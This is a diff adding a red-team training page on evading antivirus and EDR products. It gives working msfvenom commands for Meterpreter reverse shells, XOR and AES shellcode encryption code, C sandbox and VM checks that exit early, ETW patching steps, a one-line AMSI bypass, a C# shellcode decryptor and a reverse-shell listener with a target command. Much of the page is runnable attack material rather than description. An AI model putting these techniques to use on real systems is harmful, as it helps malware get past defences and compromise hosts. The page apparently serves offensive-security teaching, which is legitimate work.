@@ -1,0 +1,602 @@
+---
+layout: training-page
+title: "AV / EDR Evasion — Red Team Academy"
+module: "Evasion"
+tags:
+  - av-evasion
+  - edr
+  - unhooking
+  - sleep-encryption
+  - obfuscation
+page_key: "evasion-av-edr"
+---
+<h1>AV / EDR Evasion</h1>
+
+  <h2>AV vs EDR — Detection Layers</h2>
+  <p>Understanding what each security product inspects helps target evasion techniques at the right layer. Traditional AV focuses on file signatures; EDR adds behavioral monitoring, kernel hooks, memory scanning, and telemetry collection.</p>
+
+  <div class="diagram-container">
+    <img src="/images/evasion/av-edr-layers.svg" alt="AV/EDR detection stack with 4 layers (signatures, AMSI, userland hooks, ETW) and corresponding bypass techniques for each">
+    <div class="diagram-label">// av/edr detection layers and targeted evasion approaches</div>
+  </div>
+
+  <pre><code>># AV (Traditional Antivirus):
+# - File-based signature scanning (hash, byte patterns)
+# - Heuristic scanning (static analysis)
+# - AMSI integration for scripts
+# Detection surface: file on disk, AMSI scan buffer
+
+# EDR (Endpoint Detection &amp; Response):
+# - Kernel-level hooks via minifilter drivers
+# - User-mode hooks in ntdll.dll (syscall interception)
+# - ETW (Event Tracing for Windows) telemetry
+# - Memory scanning (detect injected shellcode, unbacked PE)
+# - Behavioral analysis (process hollowing, injection patterns)
+# - Network telemetry (C2 callback patterns)
+# - Cloud-based ML analysis
+
+# Inspection points EDR covers:
+# 1. Disk: file write, PE metadata, hash, entropy
+# 2. Load: DLL load events, PE sections in memory
+# 3. Execute: API call sequences, syscall patterns
+# 4. Memory: RWX pages, unbacked executable memory, shellcode patterns
+# 5. Network: C2 beacon patterns, TLS fingerprints (JA3)
+# 6. Behavior: parent-child process relationships, privilege escalation</code></pre>
+
+  <h2>Payload Obfuscation and Encoding</h2>
+  <p>Breaking static signatures is the first step. Encoding, encryption, and structure modification prevent file-based and basic memory signature matches.</p>
+  <pre><code>># XOR encoding shellcode (Python):
+def xor_encode(shellcode, key):
+    return bytes([b ^ key for b in shellcode])
+
+shellcode = b"\xfc\x48\x83\xe4\xf0..."
+key = 0x41
+encoded = xor_encode(shellcode, key)
+
+# Custom encoder stub — decode at runtime in C:
+# for (int i = 0; i < len; i++) buf[i] ^= 0x41;
+
+# msfvenom encoding (less effective against modern AV):
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor_dynamic -i 5 -f raw -o shell.bin
+
+# shikata_ga_nai (x86):
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
+
+# Custom PE packer / crypter (most effective):
+# - Encrypt payload with AES-256 or ChaCha20
+# - Stub decrypts at runtime into a memory buffer
+# - Execute from memory (no disk write for payload)
+
+# Change PE metadata to avoid hash matching:
+# - Recompile from source
+# - Change strings, imports, section names
+# - Add padding to change file hash
+# - Modify timestamp, rich header</code></pre>
+
+  <h2>EDR Hook Detection and Unhooking</h2>
+  <p>EDR products hook user-mode API functions in ntdll.dll by overwriting function prologues with JMP instructions that redirect calls to the EDR's inspection code. Unhooking restores the original bytes from disk (a clean copy of ntdll.dll).</p>
+  <pre><code>># How hooks work:
+# Normal: ntdll!NtCreateProcess prologue = "4C 8B D1 B8 ..." (syscall stub)
+# Hooked: ntdll!NtCreateProcess prologue = "E9 xx xx xx xx" (JMP to EDR code)
+
+# Unhooking — load a fresh ntdll.dll from disk and restore sections:
+# (Conceptual — actual implementation varies by tool)
+# 1. Load ntdll.dll from disk: CreateFile → MapViewOfFile
+# 2. Locate .text section in loaded copy
+# 3. Compare against in-process ntdll .text section
+# 4. Copy original bytes back for differing bytes (hooked functions)
+
+# Tools that implement unhooking:
+# - RefleXXion (C# .NET unhooker)
+# - ShellyCoat
+# - Havoc C2 built-in unhooking
+# - Hell's Gate / Halo's Gate (syscall enumeration and direct invocation)
+
+# Manual hook check with x64dbg/Windbg:
+# bp ntdll!NtCreateProcess
+# Check: does the first instruction start with "4C 8B D1" (normal) or "E9" (hooked)?
+
+# Hell's Gate — read syscall numbers from hooked ntdll and call directly:
+# Extracts SSN (syscall service number) from unhooked neighbor functions
+# Calls via inline assembly (no ntdll call at all)</code></pre>
+
+  <h2>Direct Syscalls</h2>
+  <p>Direct syscalls bypass user-mode hooks entirely by executing the syscall instruction with the correct System Service Number (SSN), never calling through ntdll. This defeats EDR user-mode hooks but not kernel-level inspection.</p>
+  <pre><code>># Syscall stub concept (x64 MASM):
+; NtAllocateVirtualMemory stub
+NtAllocateVirtualMemory PROC
+    mov r10, rcx
+    mov eax, 18h    ; SSN for NtAllocateVirtualMemory (varies by OS version!)
+    syscall
+    ret
+NtAllocateVirtualMemory ENDP
+
+# The SSN changes across Windows versions — use dynamic resolution:
+# SysWhispers2: generates dynamic syscall stubs
+# https://github.com/jthuraisamy/SysWhispers2
+# Output: header + ASM stubs for selected NtAPI functions
+
+# Usage after SysWhispers2 generation:
+# NTSTATUS status = NtAllocateVirtualMemory(hProcess, &baseAddress, 0, &regionSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+# Tools that use direct syscalls:
+# - Havoc C2 (built-in indirect syscalls)
+# - BruteRatel C4
+# - Many modern C# tools via SysWhispers</code></pre>
+
+  <h2>Sleep Encryption / Heap Encryption</h2>
+  <p>EDR memory scanners look for shellcode patterns while a payload is sleeping between C2 callbacks. Sleep encryption encrypts the payload in memory during sleep intervals, decrypting only when active — making memory scans during sleep find only ciphertext.</p>
+  <pre><code>># Sleep encryption concept:
+# 1. Implant wakes, decrypts itself in memory
+# 2. Performs beacon/tasking
+# 3. Before sleeping: encrypt own memory region with AES/ChaCha20
+# 4. Sleep N seconds
+# 5. Wake, decrypt, repeat
+
+# Implementations:
+# - Ekko (open-source C++ sleep mask using ROP chains)
+# - Foliage (Cobalt Strike sleep mask)
+# - Nightmask (BOF-based)
+# - Most modern commercial C2s (Cobalt Strike, BruteRatel) support this natively
+
+# Cobalt Strike sleep mask (Aggressor Script):
+# set sleep_mask "true";  # in Malleable C2 profile
+# Encrypts heap + stack before sleeping
+
+# Memory region permissions — avoid RWX pages:
+# RWX (readable + writable + executable) is suspicious
+# Allocate RW, copy shellcode, then change to RX:
+VirtualProtect(shellcode_ptr, shellcode_size, PAGE_EXECUTE_READ, &old_protect);
+# RX pages with no corresponding backed file are still detectable
+# but less suspicious than RWX</code></pre>
+
+  <h2>Process Injection Overview</h2>
+  <p>Injecting into a benign host process conceals activity under a trusted process name. Common injection methods and their detection signatures:</p>
+  <pre><code>># Classic injection (highly detected):
+# OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
+
+# Less-detected alternatives:
+
+# Process Hollowing:
+# SpawnProcess(suspended) → UnmapMainModule → WriteShellcode → ResumeThread
+# Injects into new process at its entry point
+
+# Module Stomping (DLL Hollowing):
+# Load legitimate DLL → overwrite .text section with shellcode
+# Memory shows legit backed module path — harder to detect
+
+# APC Injection:
+# OpenProcess → VirtualAllocEx → WriteProcessMemory → QueueUserAPC → ResumeThread
+# Executes when target thread enters alertable state
+
+# Thread Hijacking (SetThreadContext):
+# SuspendThread → GetThreadContext → modify RIP → SetThreadContext → ResumeThread
+
+# DLL Injection:
+# OpenProcess → VirtualAllocEx (DLL path) → WriteProcessMemory → CreateRemoteThread(LoadLibraryA)
+
+# Reflective DLL Injection:
+# Write DLL into memory → call reflective loader function
+# DLL loads itself from memory without disk write or LoadLibrary
+# Tool: ReflectiveDLLInjection by Stephen Fewer</code></pre>
+
+  <h2>Shellcode XOR Encryption</h2>
+  <p>Encrypting shellcode defeats static signature scanning — the raw shellcode bytes are never present in the binary. At runtime, the encrypted bytes are decrypted and executed. XOR is simple but effective when the key is not trivially guessable.</p>
+  <pre><code># Workflow:
+# 1. Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.bin
+# 2. Encrypt with Python:
+python3 -c "
+data = open('shell.bin','rb').read()
+key = b'redteamexercises'
+enc = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+print(','.join(hex(b) for b in enc))
+"
+# 3. Embed encrypted bytes in C++ runner, decrypt at runtime, execute
+
+# Runtime decrypt + execute (concept):
+# xor_decrypt(encrypted_shellcode, shellcode_size, key)
+# VirtualAlloc → copy decrypted bytes → change to PAGE_EXECUTE_READ → CreateThread
+
+# VirtualProtect trick (avoids PAGE_EXECUTE_READWRITE detection):
+# Allocate with PAGE_READWRITE → write decrypted shellcode → VirtualProtect to PAGE_EXECUTE_READ → execute
+# PAGE_EXECUTE_READWRITE is a strong EDR signal; split alloc/exec avoids it
+
+# AES encryption (stronger, harder to brute-force key):
+# Use CryptoAPI (BCryptEncrypt/BCryptDecrypt) or openssl AES-256-CBC
+# Keep key hardcoded or derive from environmental value (username, computername)</code></pre>
+
+  <h2>Windows API Abuse — Direct Syscalls and Unhooking</h2>
+  <p>EDR products hook user-mode API functions in <code>ntdll.dll</code> to intercept calls like NtAllocateVirtualMemory. Bypassing these hooks lets shellcode execute without EDR visibility into API calls.</p>
+  <pre><code># EDR hooking mechanism:
+# EDR replaces first bytes of ntdll functions with JMP to EDR's monitoring code
+# ntdll is the bridge between user-mode and kernel — all Win32 API calls go through it
+
+# Technique 1: Direct Syscalls
+# Call syscall instruction directly with the syscall number, bypassing ntdll entirely
+# Tools: SysWhispers2, SysWhispers3 — generate ASM stubs with correct syscall numbers
+# SysWhispers2: https://github.com/jthuraisamy/SysWhispers2
+
+# Technique 2: Indirect Syscalls
+# Find the syscall instruction inside ntdll (even if the function start is hooked)
+# Jump past the hook to the syscall instruction within ntdll
+
+# Technique 3: Unhooking ntdll.dll
+# Load a clean copy of ntdll.dll from disk (C:\Windows\System32\ntdll.dll)
+# Overwrite the .text section of the in-memory ntdll with the clean copy
+# All hooks are removed — EDR can't see API calls in that process
+
+# PowerShell unhooking concept:
+$ntdll = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(...)
+# Or use managed unhooking tools: SharpUnhooker, etc.
+
+# Dynamic API resolution to avoid suspicious IAT:
+# LoadLibrary + GetProcAddress at runtime → function not in static import table
+# PEB walking: enumerate loaded modules → find ntdll → walk export table manually
+# API hashing: store hash of function name, resolve at runtime to avoid strings</code></pre>
+
+  <h2>Sandbox Evasion Techniques</h2>
+  <pre><code>># AV sandboxes analyze executables in automated environments
+# Detect sandbox and exit cleanly (appear benign):
+
+# Time-based evasion (sleep before executing):
+Sleep(300000);  // sleep 5 minutes — many sandboxes time out
+
+# User interaction checks (no movement = automated sandbox):
+POINT pt;
+GetCursorPos(&pt);
+Sleep(2000);
+POINT pt2; GetCursorPos(&pt2);
+if (pt.x == pt2.x && pt.y == pt2.y) exit(0);  // no mouse movement
+
+# Recent keyboard activity:
+LASTINPUTINFO lii; lii.cbSize = sizeof(LASTINPUTINFO);
+GetLastInputInfo(&lii);
+if ((GetTickCount() - lii.dwTime) > 5000) exit(0);  // no recent input
+
+# Screen resolution check (sandboxes often use 800x600):
+if (GetSystemMetrics(SM_CXSCREEN) <= 800) exit(0);
+
+# CPU count check:
+SYSTEM_INFO si; GetSystemInfo(&si);
+if (si.dwNumberOfProcessors < 2) exit(0);  // VMs often have 1 CPU
+
+# Memory check (sandboxes often have < 4GB RAM):
+MEMORYSTATUSEX ms; GlobalMemoryStatusEx(&ms);
+if (ms.ullTotalPhys < 4294967296ULL) exit(0);
+
+# Check for sandbox DLLs loaded in process:
+# SbieDll.dll (Sandboxie), VBoxSF.dll (VirtualBox), vmmouse.dll (VMware)
+# Use CreateToolhelp32Snapshot + Module32First/Next to enumerate loaded modules
+
+# Check for VM artifacts (registry, files, processes):
+# VMware: VMware Tools processes, HKLM\SOFTWARE\VMware, Inc.
+# VirtualBox: VBoxService.exe, HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
+# Hyper-V: vmbus, vmicheartbeat services
+if (CheckForVMProcess("vmtoolsd.exe")) exit(0);
+
+# Domain-joined check (sandboxes often not domain-joined):
+LPWSTR domainName = nullptr; NETSETUP_JOIN_STATUS joinStatus;
+NetGetJoinInformation(nullptr, &domainName, &joinStatus);
+if (joinStatus != NetSetupDomainName) exit(0);</code></pre>
+
+  <h2>Anti-Debugging Techniques</h2>
+  <p>Malware and implants use layered anti-debugging checks to detect reverse engineering environments and alter behavior (usually exiting cleanly) before executing the real payload. Checks fall into several categories.</p>
+  <pre><code># Categories of anti-debugging checks:
+# API-based:    IsDebuggerPresent(), CheckRemoteDebuggerPresent(), NtQueryInformationProcess()
+# PEB/TEB:      PEB.BeingDebugged flag, PEB.NtGlobalFlag heap flags
+# Trap-based:   INT 3, INT 2D, ICEBP (0xF1), Single Step via EFLAGS trap flag
+# Timing:       RDTSC, QueryPerformanceCounter, GetTickCount — measure execution delay
+# Hardware:     Debug registers DR0–DR7, thread hiding
+# SEH/VEH:      Set up exception handlers that behave differently under a debugger
+
+# PEB.NtGlobalFlag check (x64):
+# pPeb = __readgsqword(0x60)
+# If (pPeb->NtGlobalFlag & 0x70) != 0 → debugger present
+# Flag 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+
+# RDTSC timing check:
+# t1 = __rdtsc(); Sleep(10); t2 = __rdtsc();
+# If (t2 - t1) is abnormally small → debugger is distorting time
+
+# Hardware breakpoint detection (DR0-DR7 registers):
+# CONTEXT ctx = &#123;0&#125;; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+# GetThreadContext(GetCurrentThread(), &ctx);
+# If ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3 → hardware BP set
+
+# NtQueryInformationProcess DebugPort (ProcessInformationClass = 7):
+# Returns non-zero DebugPort if process is being debugged at kernel level
+# Harder to spoof than IsDebuggerPresent
+
+# TLS Callback (executes before main/WinMain, before most debugger BPs):
+# Declare void NTAPI TLSCallback(PVOID, DWORD, PVOID) with DLL_PROCESS_ATTACH
+# Register via linker pragma — most debuggers miss this if BPs are set on main()
+
+# Thread hiding via NtSetInformationThread (ThreadInformationClass = 0x11):
+# Hides a thread from the debugger's thread list — breakpoints on it are ignored
+
+# Reference: al-khaser project (hundreds of anti-debug/VM/sandbox tests):
+# git clone https://github.com/LordNoteworthy/al-khaser</code></pre>
+
+  <h2>Anti-VM Detection Techniques</h2>
+  <p>Malware checks for virtual machine artifacts to detect sandbox and analysis environments. If a VM is detected, the payload typically exits cleanly to appear benign. These checks complement anti-sandbox techniques targeting behavioral analysis environments.</p>
+  <pre><code># CPUID hypervisor bit (ECX bit 31 when leaf=1):
+# int cpuInfo[4]; __cpuid(cpuInfo, 1);
+# if (cpuInfo[2] >> 31) & 1 → hypervisor present (VM)
+
+# Known VM MAC address prefixes:
+# VMware:      00:05:69, 00:0C:29, 00:50:56
+# VirtualBox:  08:00:27
+# QEMU/KVM:    52:54:00
+# Enumerate with GetAdaptersInfo() and compare first 3 octets
+
+# VM-specific registry keys:
+# VMware: HKLM\SYSTEM\CurrentControlSet\Services\vmtools (vmtoolsd.exe)
+#         HKLM\SOFTWARE\VMware, Inc.
+# VirtualBox: HKLM\SYSTEM\CurrentControlSet\Services\VBoxService
+#             HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions
+# QEMU: qemu-ga service
+
+# VM-specific device paths:
+# VirtualBox: \\.\VBoxMiniRdrDN, C:\Windows\System32\drivers\vmmouse.sys
+# VMware:     \\.\VMCI, vmhgfs.sys
+
+# VM BIOS/SMBIOS strings (GetSystemFirmwareTable or WMI):
+# "VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V" in manufacturer field
+
+# VM-specific processes:
+# vmtoolsd.exe, vmwaretray.exe, vboxservice.exe, vboxtray.exe, xenservice.exe
+# Use CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS) to enumerate
+
+# Timing anomalies:
+# VMs may have slower TSC or inconsistent I/O timing vs physical hardware
+# Cross-reference RDTSC deltas with expected physical machine ranges</code></pre>
+
+  <h2>EDR Detection Types</h2>
+  <p>Modern AV and EDR products layer multiple detection methods. Understanding each type helps target evasion at the right layer — defeating signature scanning is not enough if behavioral analysis is active.</p>
+  <pre><code># 1. Signature-Based Detection
+# - Hash matching, byte pattern matching against known malware databases
+# - Scans files on write and load events
+# - Evasion: polymorphism, encryption, custom packers, changing file metadata
+
+# 2. Heuristic Detection (static rules)
+# - Flags suspicious attributes without signature match:
+#   - VirtualAllocEx + WriteProcessMemory imports
+#   - High entropy sections (suggests packing/encryption)
+#   - Small .text section + large .data (payload stored in data)
+#   - Non-standard PE headers or modified timestamps
+# - Evasion: padding payloads, splitting imports, multi-stage delivery
+
+# 3. Behavioral Detection (runtime monitoring)
+# - Tracks API call sequences and system call patterns
+# - Flags: CreateProcess→InjectShellcode→CreateRemoteThread chains
+# - Flags: Office/browser spawning PowerShell
+# - Flags: autorun registry writes, scheduled task creation
+# - Evasion: PPID spoofing, staging with delays, inject into benign processes
+
+# 4. Machine Learning Detection
+# - Models trained on API call sequences, PE metadata, entropy values
+# - Inputs: syscall patterns, file structure, memory snapshots
+# - Evasion: adversarial noise (junk API calls, fake strings), mimic benign software
+#   structure and entropy, copy behavior of explorer.exe
+
+# Detection Type vs Evasion Technique mapping:
+# Signature    → encrypt/pack/encode payload
+# Heuristic    → reduce entropy, normalize PE, delay load suspicious APIs
+# Behavioral   → PPID spoof, sleep with variation, use LOLBins as intermediary
+# ML           → insert benign-looking operations, mimic known-good telemetry</code></pre>
+
+  <h2>Userland vs Kernel Hooking</h2>
+  <p>EDR products intercept execution at two levels. Understanding which layer is active determines which bypass techniques are effective. Most commercial EDRs deploy both layers simultaneously.</p>
+  <pre><code># Userland Hooking (most common in commercial EDR):
+# Target: API functions in ntdll.dll, kernel32.dll, user32.dll
+# Method: Inline hooks — overwrite function prologue with JMP to EDR code
+#         IAT hooks — replace function pointers in Import Address Table
+# Examples hooked: CreateProcess, VirtualAllocEx, NtCreateThreadEx, NtWriteVirtualMemory
+# Bypass: Direct syscalls (skip ntdll entirely), unhook by restoring clean bytes from disk
+# Limitation: Cannot see calls that go directly to kernel (syscall instruction)
+
+# Kernel Hooking (used by enterprise-grade EDR):
+# Target: System calls, kernel events
+# Methods:
+#   SSDT Hooking — modify System Service Dispatch Table (patched by PatchGuard on modern Windows)
+#   Callback Registration — PsSetCreateProcessNotifyRoutine, PsSetLoadImageNotifyRoutine
+#   Object Callbacks — ObRegisterCallbacks (intercept process/thread handle operations)
+#   ETW — Event Tracing for Windows as kernel-level telemetry source
+# Cannot be bypassed with user-mode techniques alone
+# Bypass: Requires kernel driver (BYOVD — Bring Your Own Vulnerable Driver), rootkits
+
+# Detecting if functions are hooked:
+# - Load clean ntdll.dll from disk, compare .text section byte-by-byte with in-memory version
+# - Hooked function: first bytes = E9 xx xx xx (JMP) or FF 25 (JMP [rip+X])
+# - Clean function: first bytes = 4C 8B D1 (mov r10, rcx) B8 XX 00 00 00 (syscall number)
+# Tools: PE-sieve, HookFinder, HollowsHunter</code></pre>
+
+  <h2>ETW Bypass</h2>
+  <p>Event Tracing for Windows (ETW) is a kernel-level telemetry system used by EDR products to receive real-time events — process creation, DLL loading, memory allocation, and network activity. Patching ETW removes this visibility. Two approaches are used: patching EtwEventWrite to return immediately, or restoring it from a clean copy to remove EDR hooks on it.</p>
+  <pre><code># ETW patch approach 1: make EtwEventWrite return immediately
+# Overwrite first byte of EtwEventWrite in ntdll.dll with 0xC3 (RET)
+# Effect: all ETW events silently dropped, EDR loses telemetry
+
+# Conceptual steps:
+# hNtdll = GetModuleHandleA("ntdll.dll")
+# pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
+# VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &old)
+# *pEtwEventWrite = 0xC3  # RET instruction
+# VirtualProtect(pEtwEventWrite, 1, old, &old)
+
+# ETW patch approach 2: restore clean bytes (remove EDR's ETW hook)
+# Map clean ntdll.dll from disk (CreateFileMapping + MapViewOfFile)
+# Locate EtwEventWrite in clean copy, copy 16 bytes back over hooked version
+# Removes EDR jump stub, restores original function behavior
+
+# Detection risk:
+# - YARA rules scan for 0xC3 at start of EtwEventWrite
+# - EDRs like Defender ATP and CrowdStrike validate integrity of ntdll functions
+# - Restoring clean bytes is more stealthy but still detectable via runtime validation
+
+# PowerShell AMSI bypass (same principle — patch AmsiScanBuffer to return clean):
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
+
+  <h2>EDR Telemetry and Behavioral Graph Detection</h2>
+  <p>EDRs do not rely on a single detection vector. They combine telemetry streams into behavioral graphs — each process and event is a node, relationships form edges. Even unknown malware can trigger alerts when the graph pattern matches known attack sequences.</p>
+  <pre><code># Telemetry vectors EDRs monitor:
+# - Process creation/termination (CreateProcess, NtCreateProcessEx)
+# - Module loading (LoadLibrary, LdrLoadDll) → DLL load events
+# - File access/writes (file system minifilter driver)
+# - Registry reads/writes (registry filter driver)
+# - Network activity (NDIS filter, ETW)
+# - Parent-child relationships (process tree lineage)
+# - Memory allocations and protection changes
+# - Syscall call stacks (origin address of syscall)
+
+# Log sources EDRs consume:
+# - Windows Event Log: 4688 (process creation), 5140 (share access)
+# - Sysmon: Image loads (7), File creates (11), Registry mods (13), Network (3)
+# - ETW providers: Microsoft-Windows-Kernel-Process, Microsoft-Windows-Threat-Intelligence
+# - AMSI scan results
+
+# Behavioral graph example — MSBuild shellcode execution:
+# Outlook.exe → MSBuild.exe → (suspicious DNS) → (memory write + thread creation)
+# Even without a matching signature, the graph pattern triggers alert
+
+# Evasion implications:
+# - Break expected graph patterns: spread actions across multiple processes
+# - Operate below radar: long sleep intervals between C2 callbacks
+# - Inject into processes already in normal behavioral profile (svchost, explorer)
+# - Delay RW→RX memory transition to outlive heuristic windows (Sleep(10000) between steps)
+# - Never assume successful execution = undetected (post-mortem analysis may reveal everything)</code></pre>
+
+  <h2>Post-Exploitation Behavioral Evasion</h2>
+  <p>After initial access, post-exploitation activity generates the highest volume of EDR telemetry. Behavioral evasion in this phase focuses on manipulating process relationships, memory flows, and execution patterns to appear like legitimate system activity.</p>
+  <pre><code># Post-exploitation anti-EDR tactic categories:
+# API Evasion:    Direct/indirect syscall invocation to bypass userland hooks
+# Memory Evasion: Allocate RW → write shellcode → delay → change to RX
+# Event Disruption: Unhook ETW, patch AMSI before payload executes
+# Process Tricks: PPID spoofing, sacrificial process injection, LOLBins
+# Hook Detection: Scan ntdll.dll for JMP bytes, patch back to clean syscall stubs
+
+# PPID Spoofing (parent process ID spoofing):
+# EDRs flag suspicious parent-child chains: cmd.exe → powershell.exe → certutil.exe
+# Solution: use STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to set a
+# legitimate parent (explorer.exe, svchost.exe) when spawning a new process
+# OPSEC: match command-line expectations of the spoofed parent, check token/ACL alignment
+
+# Memory protection evasion (avoids immediate RW→RX flag):
+# VirtualAllocEx(..., PAGE_READWRITE)   # Step 1: allocate as RW
+# WriteProcessMemory(...)               # Step 2: write shellcode
+# Sleep(10000)                          # Step 3: delay (outlive heuristic window)
+# VirtualProtectEx(..., PAGE_EXECUTE_READ) # Step 4: change to RX (never RWX)
+
+# Full-chain evasion flow used by advanced implants:
+# 1. Map shellcode via NtCreateSection (no VirtualAlloc call in logs)
+# 2. Inject via APC into spoofed-parent sacrificial process
+# 3. Execute shellcode via syscall stub (bypass userland hooks)
+# 4. Patch ETW + AMSI before C2 check-in
+# 5. Sleep with encrypted heap between beacons
+
+# Tools: ScareCrow (shellcode loader), DInvoke (dynamic P/Invoke), Donut (PE to shellcode)</code></pre>
+
+  <h2>Static Analysis — ThreatCheck Workflow</h2>
+  <p>When a payload is detected on disk, the exact bytes triggering detection are not obvious. <strong>ThreatCheck</strong> automates the process: it splits the binary into halves, asks Defender to scan each, and recursively narrows down until it isolates the exact byte range that triggers the detection signature. This tells you precisely what to encrypt or obfuscate.</p>
+  <pre><code># ThreatCheck — find the exact bytes Defender detects in your binary:
+# https://github.com/rasta-mouse/ThreatCheck
+
+# Basic usage (disable real-time protection first for accurate results):
+ThreatCheck.exe -f .\payload.exe
+
+# ThreatCheck splits the file and scans chunks until it isolates the trigger:
+# Output shows the last ~20 bytes of the flagged region — the signature anchor
+
+# Common findings:
+# - Meterpreter shellcode bytes (even a 50-byte window of raw shellcode matches)
+# - Known string patterns (e.g., WannaCry: "WNcry@2ol7")
+# - Import table patterns (VirtualAllocEx + WriteProcessMemory combination)
+
+# Workflow: use ThreatCheck to identify, then encrypt that specific section:
+# 1. Run ThreatCheck → see flagged bytes
+# 2. XOR or AES encrypt those bytes (or entire shellcode buffer)
+# 3. Recompile with encrypted payload + runtime decryption stub
+# 4. Re-run ThreatCheck → "No threat found!"
+
+# Explore Defender's signature database to understand what strings are flagged:
+# ExpandDefenderSig.ps1 (Matt Graeber) decompresses Defender signature .vdm files:
+Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1
+ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\*\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw
+# Search extracted database:
+C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7"</code></pre>
+
+  <h2>Static Analysis Evasion — AES Encryption Pattern</h2>
+  <p>XOR encryption is often insufficient against modern Defender signatures — the encrypted shellcode's statistical patterns or the decryption loop itself may still match. AES-CBC encryption provides stronger evasion because it produces output indistinguishable from random bytes with no recoverable key from static analysis.</p>
+  <pre><code># Static analysis evasion workflow:
+# 1. Generate shellcode: msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp
+# 2. XOR or AES encrypt shellcode offline (CyberChef or Python)
+# 3. Store only the encrypted bytes in the binary
+# 4. Decrypt at runtime, write to allocated memory, execute
+
+# AES-CBC decryption in C# (.NET Framework):
+using System.Security.Cryptography;
+
+// Encrypted shellcode (base64-encoded AES-CBC ciphertext):
+string bufEnc = "BASE64_CIPHERTEXT_HERE";
+
+// Key and IV (arbitrary — keep hardcoded or derive from environment):
+byte[] key = new byte[16] &#123; 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 &#125;;
+byte[] iv  = new byte[16] &#123; 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 &#125;;
+
+Aes aes = Aes.Create();
+ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
+byte[] buf;
+using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
+using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+using (var msPlain = new System.IO.MemoryStream()) &#123;
+    csDecrypt.CopyTo(msPlain);
+    buf = msPlain.ToArray();
+&#125;
+// buf now contains the original shellcode — allocate RW, copy, change to RX, execute
+
+# CyberChef AES encryption recipe for shellcode:
+# From_Hex('0x with comma') → AES_Encrypt(key, iv, CBC, Raw, Raw) → To_Base64
+
+# Key insight: after AES encryption, ThreatCheck reports "No threat found"
+# Even if Defender scans the process memory at runtime, decrypted shellcode
+# in a non-Meterpreter payload (e.g., micr0_shell custom payload) will also
+# not match signatures — changing the payload avoids behavioral detection too</code></pre>
+
+  <h2>Dynamic Analysis Evasion — Three Approaches</h2>
+  <p>Dynamic analysis (memory scanning triggered by behavioral events like new process creation) catches payloads that static analysis misses. Three approaches to evade it: modify the known payload's source to avoid signature matches, swap to a less-known payload, or write a fully custom tool that has no known signatures.</p>
+  <pre><code># The problem: static analysis is bypassed but runtime memory scan still detects
+# Defender scans process memory on behavioral triggers (suspicious child process, etc.)
+# Meterpreter shellcode remains unencrypted in memory once executing → detected
+
+# --- Approach 1: Modify the Payload ---
+# Change the Meterpreter source so the shellcode no longer matches known signatures
+# Requires modifying Metasploit source (out of scope for most engagements)
+# Alternative: use a custom shellcode stager that decrypts to non-Meterpreter bytes
+
+# --- Approach 2: Change the Payload to Less-Known Shellcode ---
+# Replace Meterpreter shellcode with a minimal custom reverse shell payload
+# Example: micr0_shell — generates null-free PIC reverse shell shellcode
+# https://github.com/senzee1984/micr0_shell
+
+# Generate micr0_shell shellcode (Python):
+python.exe micr0_shell.py -i 10.10.14.5 -p 8080 -l csharp
+
+# Embed the AES-encrypted output in the shellcode loader
+# Even if Defender scans memory, micr0_shell has no signature → no detection
+
+# --- Approach 3: Write Fully Custom Tools ---
+# Custom-written reverse shell has no known signatures in Defender's database
+# Neither static nor behavioral analysis will flag it
+# Does not require any shellcode or known-malicious API patterns
+
+# Example: C# TcpClient reverse shell that spawns powershell.exe
+# - Connect to attacker IP/Port via TcpClient
+# - Spawn powershell.exe with -ep bypass -nologo
+# - Redirect STDIN/STDOUT/STDERR to the TCP stream
+# - No VirtualAlloc, no shellcode, no meterpreter → nothing to detect
+# Detection risk: only behavioral (Office spawning PS, suspicious parent chain)
+# This approach works even with real-time protection enabled if the tool is new
+
+# Listener on attacker:
+nc -lvnp 8080
+# Run on target: RShell.exe 10.10.14.5 8080</code></pre>
